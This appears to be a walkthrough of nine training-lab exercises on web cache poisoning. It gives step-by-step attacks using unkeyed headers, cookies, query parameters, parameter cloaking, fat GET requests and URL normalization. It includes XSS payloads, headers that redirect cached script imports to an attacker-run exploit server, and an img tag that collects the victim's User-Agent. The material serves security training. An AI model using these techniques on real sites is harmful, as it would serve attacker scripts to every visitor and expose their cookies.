<!-- omit in toc -->
# Web cache poisoning with an unkeyed header

<!-- omit in toc -->
## Table of Contents

- [Web cache poisoning with an unkeyed header](#web-cache-poisoning-with-an-unkeyed-header)
- [Web cache poisoning with an unkeyed cookie](#web-cache-poisoning-with-an-unkeyed-cookie)
- [Web cache poisoning with multiple headers](#web-cache-poisoning-with-multiple-headers)
- [Targeted web cache poisoning using an unknown header](#targeted-web-cache-poisoning-using-an-unknown-header)
- [Web cache poisoning via an unkeyed query string](#web-cache-poisoning-via-an-unkeyed-query-string)
- [Web cache poisoning via an unkeyed query parameter](#web-cache-poisoning-via-an-unkeyed-query-parameter)
- [Parameter cloaking](#parameter-cloaking)
- [Web cache poisoning via a fat GET request](#web-cache-poisoning-via-a-fat-get-request)
- [URL normalization](#url-normalization)

## Web cache poisoning with an unkeyed header
Reference: https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-header

<!-- omit in toc -->
### Solution 
1. With Burp running, load the website's home page
2. In Burp, go to "Proxy" > "HTTP history" and study the requests and responses that you generated. Find the GET request for the home page and send it to Burp Repeater.
3. Add a cache-buster query parameter, such as ?cb=1234.
4. Add the ``X-Forwarded-Host`` header with an arbitrary hostname, such as ``example.com``, and send the request.
5. Observe that the X-Forwarded-Host header has been used to dynamically generate an absolute URL for importing a JavaScript file stored at ``/resources/js/tracking.js``.
6. Replay the request and observe that the response contains the header ``X-Cache: hit``. This tells us that the response came from the cache.
7. Go to the exploit server and change the file name to match the path used by the vulnerable response:
```
/resources/js/tracking.js
```
8. In the body, enter the payload alert(document.cookie) and store the exploit.
9. Open the GET request for the home page in Burp Repeater and remove the cache buster.
10. Add the following header, remembering to enter your own exploit server ID:
```
X-Forwarded-Host: your-exploit-server-id.web-security-academy.net
```
11. Send your malicious request. Keep replaying the request until you see your exploit server URL being reflected in the response and X-Cache: hit in the headers.
12. To simulate the victim, load the poisoned URL in your browser and make sure that the alert() is triggered. Note that you have to perform this test before the cache expires. The cache on this lab expires every 30 seconds.
13. If the lab is still not solved, the victim did not access the page while the cache was poisoned. Keep sending the request every few seconds to re-poison the cache until the victim is affected and the lab is solved.

## Web cache poisoning with an unkeyed cookie
Reference: https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-cookie

<!-- omit in toc -->
### Solution
1. With Burp running, load the website's home page.
2. In Burp, go to "Proxy" > "HTTP history" and study the requests and responses that you generated. Notice that the first response you received sets the cookie ``fehost=prod-cache-01``.
3. Reload the home page and observe that the value from the ``fehost`` cookie is reflected inside a double-quoted JavaScript object in the response.
4. Send this request to Burp Repeater and add a cache-buster query parameter.
5. Change the value of the cookie to an arbitrary string and resend the request. Confirm that this string is reflected in the response.
6. Place a suitable XSS payload in the ``fehost`` cookie, for example:
```
fehost=someString"-alert(1)-"someString
```
7. Replay the request until you see the payload in the response and ``X-Cache: hit`` in the headers.
8. Load the URL in your browser and confirm the ``alert()`` fires.
9. Go back Burp Repeater, remove the cache buster, and replay the request to keep the cache poisoned until the victim visits the site and the lab is solved.

## Web cache poisoning with multiple headers
Reference: https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-multiple-headers

<!-- omit in toc -->
### Quick Solution
The tricky part here was to understand that we had to use both the ``X-Forwarded-Host`` and the ``X-Forwarded-Scheme`` headers. Once you get that it becomes easy peasy.

<!-- omit in toc -->
### Solution
1. With Burp running, load the website's home page.
2. Go to "Proxy" > "HTTP history" and study the requests and responses that you generated. Find the ``GET`` request for the JavaScript file ``/resources/js/tracking.js`` and send it to Burp Repeater.
3. Add a cache-buster query parameter and the X-Forwarded-Host header with an arbitrary hostname, such as example.com. Notice that this doesn't seem to have any effect on the response.
4. Remove the ``X-Forwarded-Host`` header and add the ``X-Forwarded-Scheme`` header instead. Notice that if you include any value other than HTTPS, you receive a 302 response. The Location header shows that you are being redirected to the same URL that you requested, but using https://.
5. Add the X-Forwarded-Host: example.com header back to the request, but keep ``X-Forwarded-Scheme: nothttps`` as well. Send this request and notice that the ``Location`` header of the 302 redirect now points to ``https://example.com/``.
6. Go to the exploit server and change the file name to match the path used by the vulnerable response:
```
/resources/js/tracking.js
```
7. In the body, enter the payload alert(document.cookie) and store the exploit.
8. Go back to the request in Burp Repeater and set the X-Forwarded-Host header as follows, remembering to enter your own exploit server ID:
```
X-Forwarded-Host: your-exploit-server-id.web-security-academy.net
```
9. Make sure the ``X-Forwarded-Scheme`` header is set to anything other than ``HTTPS``.
10. Send the request until you see your exploit server URL reflected in the response and ``X-Cache: hit`` in the headers.
11. To check that the response was cached correctly, right-click on the request in Burp, select "Copy URL", and load this URL in your browser. If the cache was successfully poisoned, you will see the script containing your payload, ``alert(document.cookie)``. Note that the ``alert()`` won't actually execute here.
12. Go back to Burp Repeater, remove the cache buster, and resend the request until you poison the cache again.
13. To simulate the victim, reload the home page in your browser and make sure that the ``alert()`` fires.
14. Keep replaying the request to keep the cache poisoned until the victim visits the site and the lab is solved.

## Targeted web cache poisoning using an unknown header
Reference: https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-targeted-using-an-unknown-header

<!-- omit in toc -->
### Quick Solution
This is **multi-step** lab. The first thing to do is notice that the ``Vary`` header is used by the backend service. To target the correct user we need to identify their ``User Agent``. In order to do that we can leverage the HTML features in the comments. Once we have done that we can prepare a simple web-cache-poisoning attack as in the previous labs.

<!-- omit in toc -->
### Solution
Solving this lab requires multiple steps. First, you need to identify where the vulnerability is and study how the cache behaves. You then need to find a way of targeting the right subset of users before finally poisoning the cache accordingly.

1. With Burp running, load the website's home page.
2. In Burp, go to "Proxy" > "HTTP history" and study the requests and responses that you generated. Find the ``GET`` request for the home page.
3. With the Param Miner extension enabled, right-click on the request and select "Guess headers". After a while, Param Miner will report that there is a secret input in the form of the ``X-Host`` header.
4. Send the ``GET`` request to Burp Repeater and add a cache-buster query parameter.
5. Add the ``X-Host`` header with an arbitrary hostname, such as example.com. Notice that the value of this header is used to dynamically generate an absolute URL for importing the JavaScript file stored at ``/resources/js/tracking.js``.
6. Go to the exploit server and change the file name to match the path used by the vulnerable response:
```
/resources/js/tracking.js
```
7. In the body, enter the payload ``alert(document.cookie)`` and store the exploit.
8. Go back to the request in Burp Repeater and set the X-Host header as follows, remembering to add your own exploit server ID:
```
X-Host: your-exploit-server-id.web-security-academy.net
```
9. Send the request until you see your exploit server URL reflected in the response and ``X-Cache: hit`` in the headers.
10. To simulate the victim, load the URL in your browser and make sure that the ``alert()`` fires.
11. Notice that the ``Vary`` header is used to specify that the ``User-Agent`` is part of the cache key. To target the victim, you need to find out their ``User-Agent``.
12. On the website, notice that the comment feature allows certain HTML tags. Post a comment containing a suitable payload to cause the victim's browser to interact with your exploit server, for example:
```
<img src="https://your-exploit-server-id.web-security-academy.net/foo" />
```
13. Go to the blog page and double-check that your comment was successfully posted.
14. Go to the exploit server and click the button to open the "Access log". Refresh the page every few seconds until you see requests made by a different user. This is the victim. Copy their ``User-Agent`` from the log.
15. Go back to your malicious request in Burp Repeater and paste the victim's ``User-Agent`` into the corresponding header. Remove the cache buster.
16. Keep sending the request until you see your exploit server URL reflected in the response and ``X-Cache: hit`` in the headers.
17. Replay the request to keep the cache poisoned until the victim visits the site and the lab is solved

## Web cache poisoning via an unkeyed query string
Reference: https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-query

<!-- omit in toc -->
### Solution
1. With Burp running, load the website's home page. In Burp, go to "Proxy" > "HTTP history". Find the ``GET`` request for the home page. Notice that this page is a potential cache oracle. Send the request to Burp Repeater.
2. Add arbitrary query parameters to the request. Observe that you can still get a cache hit even if you change the query parameters. This indicates that they are not included in the cache key.
3. Notice that you can use the ``Origin`` header as a cache buster. Add it to your request.
4. When you get a cache miss, notice that your injected parameters are reflected in the response. If the response to your request is cached, you can remove the query parameters and they will still be reflected in the cached response.
5. Add an arbitrary parameter that breaks out of the reflected string and injects an XSS payload:
```
GET /?evil='/><script>alert(1)</script>
```
6. Keep replaying the request until you see your payload reflected in the response and ``X-Cache: hit`` in the headers.
7. To simulate the victim, remove the query string from your request and send it again (while using the same cache buster). Check that you still receive the cached response containing your payload.
8. Remove the cache-buster ``Origin`` header and add your payload back to the query string. Replay the request until you have poisoned the cache for normal users. Confirm this attack has been successful by loading the home page in your browser and observing the popup.
9. The lab will be solved when the victim user visits the poisoned home page. You may need to re-poison the cache if the lab is not solved after 35 seconds.

## Web cache poisoning via an unkeyed query parameter
Reference: https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-param

<!-- omit in toc -->
### Solution
1. Observe that the home page is a suitable cache oracle. Notice that you get a cache miss whenever you change the query string. This indicates that it is part of the cache key. Also notice that the query string is reflected in the response.
2. Add a cache-buster query parameter.
3. Use Param Miner's "Guess GET parameters" feature to identify that the parameter ``utm_content`` is supported by the application.
4. Confirm that this parameter is unkeyed by adding it to the query string and checking that you still get a cache hit. Keep sending the request until you get a cache miss. Observe that this unkeyed parameter is also reflected in the response along with the rest of the query string.
5. Send a request with a ``utm_content`` parameter that breaks out of the reflected string and injects an XSS payload:
```
GET /?utm_content='/><script>alert(1)</script>
```
6. Once your payload is cached, remove the ``utm_content`` parameter, right-click on the request, and select "Copy URL". Open this URL in your browser and check that the ``alert()`` is triggered when you load the page.
7. Remove your cache buster, re-add the ``utm_content`` parameter with your payload, and replay the request until the cache is poisoned for normal users. The lab will be solved when the victim user visits the poisoned home page

## Parameter cloaking
Reference: https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking

<!-- omit in toc -->
### Quick Solution
The important thing here was to understand which param could be excluded from the cache key: always try with **UTM parameters**!

<!-- omit in toc -->
### Solution
1. Identify that the ``utm_content`` parameter is supported. Observe that it is also excluded from the cache key.
2. Notice that if you use a semicolon (;) to append another parameter to utm_content, the cache treats this as a single parameter. This means that the extra parameter is also excluded from the cache key. Alternatively, with Param Miner loaded, right-click on the request and select "Bulk scan" > "Rails parameter cloaking scan" to identify the vulnerability automatically.
3. Observe that every page imports the script ``/js/geolocate.js``, executing the callback function ``setCountryCookie()``. Send the request ``GET /js/geolocate.js?callback=setCountryCookie`` to Burp Repeater.
4. Notice that you can control the name of the function that is called on the returned data by editing the ``callback`` parameter. However, you can't poison the cache for other users in this way because the parameter is keyed.
5. Study the cache behavior. Observe that if you add duplicate ``callback`` parameters, only the final one is reflected in the response, but both are still keyed. However, if you append the second ``callback`` parameter to the ``utm_content`` parameter using a semicolon, it is excluded from the cache key and still overwrites the callback function in the response:
```
GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=arbitraryFunction

HTTP/1.1 200 OK
X-Cache-Key: /js/geolocate.js?callback=setCountryCookie
…
arbitraryFunction({"country" : "United Kingdom"})
```
6. Send the request again, but this time pass in alert(1) as the callback function:
```
GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1)
```
7. Get the response cached, then load the home page in your browser. Check that the alert() is triggered.
8. Replay the request to keep the cache poisoned. The lab will solve when the victim user visits any page containing this resource import URL.

## Web cache poisoning via a fat GET request
Reference: https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get

<!-- omit in toc -->
### Solution
1. Observe that every page imports the script ``/js/geolocate.js``, executing the callback function ``setCountryCookie()``. Send the request ``GET /js/geolocate.js?callback=setCountryCookie`` to Burp Repeater.
2. Notice that you can control the name of the function that is called in the response by passing in a duplicate ``callback`` parameter via the request body. Also notice that the cache key is still derived from the original ``callback`` parameter in the request line:
```
GET /js/geolocate.js?callback=setCountryCookie
…
callback=arbitraryFunction

HTTP/1.1 200 OK
X-Cache-Key: /js/geolocate.js?callback=setCountryCookie
…
arbitraryFunction({"country" : "United Kingdom"})
```
3. Send the request again, but this time pass in ``alert(1)`` as the callback function. Check that you can successfully poison the cache.
4. Remove any cache busters and re-poison the cache. The lab will solve when the victim user visits any page containing this resource import URL.

## URL normalization
Reference: https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-normalization

<!-- omit in toc -->
### Solution
1. In Burp Repeater, browse to any non-existent path, such as ``GET /random``. Notice that the path you requested is reflected in the error message.
2. Add a suitable reflected XSS payload to the request line:
```
GET /random</p><script>alert(1)</script><p>foo
```
3. Notice that if you request this URL in your browser, the payload doesn't execute because it is URL-encoded.
4. In Burp Repeater, poison the cache with your payload and then immediately load the URL in your browser. This time, the ``alert()`` is executed because your browser's encoded payload was URL-decoded by the cache, causing a cache hit with the earlier request.
5. Re-poison the cache then immediately go to the lab and click "Deliver link to victim". Submit your malicious URL. The lab will be solved when the victim visits the link.